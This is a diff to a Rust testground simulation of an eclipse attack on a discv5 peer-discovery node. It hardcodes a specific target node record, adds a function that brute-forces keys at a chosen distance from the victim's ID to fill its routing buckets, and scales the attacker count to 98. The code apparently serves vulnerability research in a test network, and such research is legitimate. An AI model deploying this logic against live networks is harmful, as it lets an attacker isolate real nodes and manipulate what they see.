@@ -7,6 +7,8 @@ use discv5::Key;
 use serde::{Deserialize, Serialize};
 use std::net::SocketAddr;
 use std::u64;
+use std::time::Duration;
+use std::thread::sleep;
 use testground::client::Client;
 use tokio::task;
 use tracing::debug;
@@ -62,10 +64,10 @@ impl MonopolizingByIncomingNodes {
         // Construct a local Enr
         // ////////////////////////
         // let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
-        let tikuna_base64 = "";
+        let tikuna_base64 = "enr:-MK4QOYC2mt03zuNm5-DPcq4FHEYr5P9QFHUTxon5qCMOieLMTIDFILFdl08uZ6LOpeam7vhsZGO8MtVoMQ8lWuQQUmGAYV0g1L_h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhMASAAeJc2VjcDI1NmsxoQPeUNm9svUBEZ99-IsG56vVH_evtW3AYo6CIUwn7Sf1yohzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
         let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
         client.record_message("Generating keys!!");
-        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_keys_fill_buckets(&tikuna_enr, 1, 1).await;
+        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_single_key_fill_buckets(&tikuna_enr, client.group_seq()%5).await;
 	client.record_message(format!("Generated keys lenght: {}", eclipse_keypairs.len()));
         let enr_key = eclipse_keypairs.remove(0);
         let enr = EnrBuilder::new("v4")
@@ -75,7 +77,7 @@ impl MonopolizingByIncomingNodes {
             .udp4(9000)
             .build(&enr_key)
             .expect("Construct an Enr");
-
+	client.record_message(format!("Generated ENR!!: {}", enr.to_base64()));
         // //////////////////////////////////////////////////////////////
         // Start Discovery v5 server
         // //////////////////////////////////////////////////////////////
@@ -183,6 +185,22 @@ impl MonopolizingByIncomingNodes {
         generated_keys
     }
 
+    async fn generate_single_key_fill_buckets(enr_victim: &Enr, difficulty: u64) -> Vec<CombinedKey> {
+        let mut generated_keys = Vec::new();
+        loop {
+            let fake_new_key = CombinedKey::generate_secp256k1();
+            let fake_new_enr = EnrBuilder::new("v4").build(&fake_new_key).unwrap();
+            let victim_id: Key<NodeId> = enr_victim.node_id().into();
+            let fake_new_id: Key<NodeId> = fake_new_enr.node_id().into();
+            let distance = victim_id.log2_distance(&fake_new_id).unwrap();
+            if distance == (256 - difficulty) {
+               generated_keys.push(fake_new_key);
+               break;
+            }
+        }
+        generated_keys
+    }
+
     async fn collect_instance_info(
         &self,
         client: &Client,
@@ -200,7 +218,7 @@ impl MonopolizingByIncomingNodes {
             }
         }
 
-        assert!(victim.len() == 1 && honest.len() == 1 && attackers.len() == 48);
+        assert!(victim.len() == 1 && honest.len() == 1 && attackers.len() == 98);
 
         Ok((victim.remove(0), honest.remove(0), attackers))
     }
@@ -269,7 +287,7 @@ impl MonopolizingByIncomingNodes {
         // the FINDNODE query will be sent to the victim, and then, if the victim is vulnerable
         // to the eclipse attack, the attacker's ENR will be added to the victim's routing table
         // because of the handshake.
-        let tikuna_base64 = "";
+        let tikuna_base64 = "enr:-MK4QOYC2mt03zuNm5-DPcq4FHEYr5P9QFHUTxon5qCMOieLMTIDFILFdl08uZ6LOpeam7vhsZGO8MtVoMQ8lWuQQUmGAYV0g1L_h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhMASAAeJc2VjcDI1NmsxoQPeUNm9svUBEZ99-IsG56vVH_evtW3AYo6CIUwn7Sf1yohzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
         let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
         let current_ip_address = client.run_parameters().data_network_ip()?.expect("IP address for the data network");
         client.record_message(format!("Current IP address: {:?}", current_ip_address));
@@ -280,6 +298,7 @@ impl MonopolizingByIncomingNodes {
             client.record_message(format!("Failed to run query: {}", e));
         }
 
+        sleep(Duration::from_millis(10000));
         // Inform that sending query has been done.
         client.signal(STATE_ATTACKERS_SENT_QUERY).await?;
 
